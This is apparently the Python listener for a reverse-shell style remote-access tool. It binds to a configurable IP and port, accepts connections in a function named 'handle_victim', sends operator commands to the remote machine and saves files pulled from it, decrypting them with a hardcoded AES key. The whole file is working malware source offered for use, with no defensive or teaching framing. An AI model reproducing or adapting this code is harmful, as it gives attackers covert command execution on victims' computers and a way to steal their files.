import socket
import os
import threading
import time
from Crypto.Cipher import AES


def get_data_from_cipher(cipher):
    key = b"SymmetricKeyMike" # choose your own encryption key 16 chars long (if you wish)
    nonce = b"SymmetricKeyNce" # choose your own nonce 16 chars long (if you wish)
    data = AES.new(key, AES.MODE_EAX, nonce)
    return data.decrypt(cipher)


def download_file(file_name, sock: socket.socket):
    with open(file_name, 'wb') as file:
        result = b""
        sock.settimeout(0.2)
        while True:
            try:
                content = sock.recv(1024)
            except TimeoutError:
                break
            result += content
            if len(content) == 0 or not content:
                break
        file.write(get_data_from_cipher(result))
        sock.settimeout(None)
    print()
    print(f"File {file_name} downloaded successfully")
    print()


def handle_victim(communication_sock: socket.socket, ip):
    print(f"received connection from {ip}")
    while True:
        command = input("?> ")
        communication_sock.send(command.encode())
        if command == "exit" or command == "quit":
            print(f"disconnected from {ip}")
            communication_sock.close()
            return
        response = communication_sock.recv(1024).decode()
        if response == "f1l3DW":
            filename = communication_sock.recv(1024).decode()
            time.sleep(0.1)
            download_file(filename, communication_sock)
            response = "success"
        elif response == "ls3xecuted":
            response = communication_sock.recv(4096 * 2).decode()
        print(response)


listening_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

######
ip = "192.168.63.218" # CHANGE THIS (SERVER IP)
port = 4045 # CHANGE THIS (SERVER PORT)
######

listening_sock.bind((ip, port))

listening_sock.listen()
print(f"Server listening on ({ip}, {port})...")
while listening_sock:
    client_c_sock, addr = listening_sock.accept()
    thread = threading.Thread(target=handle_victim, args=(client_c_sock, addr))
    thread.start()

listening_sock.close()
